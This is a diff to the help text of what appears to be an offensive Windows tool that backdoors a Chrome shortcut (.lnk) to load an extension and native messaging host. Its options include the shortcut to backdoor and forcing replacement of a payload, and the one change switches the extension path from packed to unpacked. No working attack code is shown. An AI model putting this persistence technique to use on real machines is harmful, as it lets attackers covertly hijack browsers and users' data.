@@ -22,7 +22,7 @@ int help() {
 	"/nativePath    - Path for native.json to be saved to. Default = C:\\\\ProgramData\\\\native.json\n"
 	"/description   - Description of extension in native.json. Default - This is an extension that extends browser functionality\n"
 	"/lnkPath       - Path to shortcut file to retrieve target or backdoor. eg. %%HOMEPATH%%\\Desktop\\Google Chrome.lnk\n"
-	"/extensionPath - Path to packed extension. eg. C:\\\\ProgramData\\\\extensions.crx\n"
+	"/extensionPath - Path to unpacked extension. eg. C:\\\\ProgramData\\\\\n"
 	"/verbose       - Adds additional verbosity to output (Takes no argument)\n"
 	"/force         - Ignore any mutex to edit or replace old payload (Takes no argument)\n\n\n"
 
